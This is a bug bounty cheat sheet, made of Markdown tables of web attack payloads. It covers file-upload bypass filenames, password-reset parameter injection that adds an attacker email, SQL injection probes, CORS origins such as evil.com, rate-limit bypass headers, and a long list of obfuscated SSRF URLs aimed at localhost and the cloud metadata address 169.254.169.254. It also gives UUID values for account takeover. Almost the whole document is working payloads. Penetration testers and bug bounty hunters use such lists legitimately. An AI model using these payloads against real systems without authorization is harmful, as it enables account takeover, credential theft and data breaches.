# Bounty Hunter Cheatsheet
---

## File Upload

| Filename | Description |
|----------|-------------|
|.htaccess|htaccess rules|
|file.svg|svg for xss|
|file.SVg|case insensitive|
|file.png.svg|double extension|
|file.php%00.png|null byte|
|file.png' or '1'='1|sql injection|
|../../file.png|directory traversal|
|file.'svg|invalid extension|

## Password Reset

### Parameter payloads

| Payload | Description |
|----------|-------------|
|email=victim@xyz.tld&email=hacker@xyz.tld|double parameter|
|email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld|carbon copy parameter|
|email=victim@xyz.tld,hacker@xyz.tld|colon separator|
|email=victim@xyz.tld%20hacker@xyz.tld|space separator|
|email=victim@xyz.tld\|hacker@xyz.tld|pipe separator|
|email=victim|no domain or tld|
|email=victim@xyz|no tld|
|{"email":["victim@tld.xyz","hacker@tld.xyz"]}|json multiple email table|

### Related other cases

| Technique | Goal |
|----------|-------------|
|reset token modification|account takeover|
|body response token leak|account takeover|
|token guess or bruteforce (timestamp, userid)|account takeover|
|modify header host domain|host reflected in mail and steal token|

## SQL Injection

| Payload | Description |
|----------|-------------|
|/?q=1'|simple quote|
|/?q=1"|double quote|
|/?q=[1]|array value|
|/?q[]=1|array parameter|
|/?q=1\`|backquote|
|/?q=1\\ |escape backslash|
|/?q=1/\*'\*/|comment simple quote|
|/?q=1/\*!1111'\*/|comment simple quote|
|/?q=1'\|\|'asd'\|\|'|string concatenation|
|/?q=1' or '1'='1|or statement with quotes|
|/?q=1 or 1=1| or statement without quotes|
|/?q='or''='|or statement no spaces|

## CORS

| Payload | Description |
|----------|-------------|
|evil.com|attacker's fqdn|
|company.evil|attacker's tld|
|evil.company.tld|attacker's subdomain|

## Recon

| Description | Payload |
|----------|-------------|
|google dork|site:http://ideone.com \| site:http://codebeautify.org \| site:http://codeshare.io \| site:http://codepen.io \| site:http://repl.it \| site:http://justpaste.it \| site:http://pastebin.com \| site:http://jsfiddle.net \| site:http://trello.com "$TARGET"|

## File analysis

| Description | Payload |
|----------|-------------|
|find url in file|grep -Eo "(http\|https)://[a-zA-Z0-9./?=\_-]\*" \| sort -u|

## Rate limit bypass

| Description | Payload |
|----------|-------------|
|header substitution (increment if blocked)|X-Originating-IP: IP<br>X-Forwarded-For: IP<br>X-Remote-IP: IP<br>X-Remote-Addr: IP<br>X-Client-IP: IP<br>X-Host: IP<br>X-Forwared-Host: IP|

## Subdomain list

| Tool | Description |
|----------|-------------|
|amass|scan for subdomains|
|altdns|compute wordlist with result for new subdomains|
|dnsprobe|check if found subdomain is valid|
|nmap|scan subdomain port|

## Information disclosure

| Issue | Description |
|----------|-------------|
|logic|email disclosed in response after inviting a user|
|wrong parameter management|reverse search API data disclosure<br>**GET /api/users?email=X**|

## SSRF

`site.com/?url=FUZZ`

```
http://169.254.169.254\http://0.google.com <=== PHP cve2020
https://[0:0:0:0:0:0:0:0]
https://0.0.0.0
https://[::]
https://0177.1
https://0x7f.1
http://0x7f000001
http://2130706433
http://127.000.001
https://[0:0:0:0:0:ffff:0.0.0.0]
https://[::ffff:0.0.0.0]
https://017700000001
https://[0:0:0:0:0:ffff:127.0.0.1]
https://[::ffff:127.0.0.1]/
https://[::ffff:7f00:2]
https://[::ffff:127.0.0.1]
https://[::ffff:7f00:1]
https://[0:0:0:0:0:ffff:127.0.0.2]
http://[::ffff:169.254.169.254]
http://[0:0:0:0:0:ffff:169.254.169.254]
https://[::ffff:127.0.0.2]
http://[::ffff:a9fe:a9fe]
https://0x7f.0.0.1
https://[::ffff:0:0]
http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
http://②⑧⑤②⓪③⑨①⑥⑥:80/
http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/
http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥
http://169-254-169-254.nip.io
http://127.1
http://127.000000000000000.001
http://127.000.000.00000000000000001
```

## Account Takeover

UUID, 2FA, any token...

```
UUID: 0
UUID: 0000
UUID: null
UUID: nil
UUID: numerical value
UUID:
```

## Bad Practice

- Check if email links are in HTTP
- Check if old password is asked when changing password
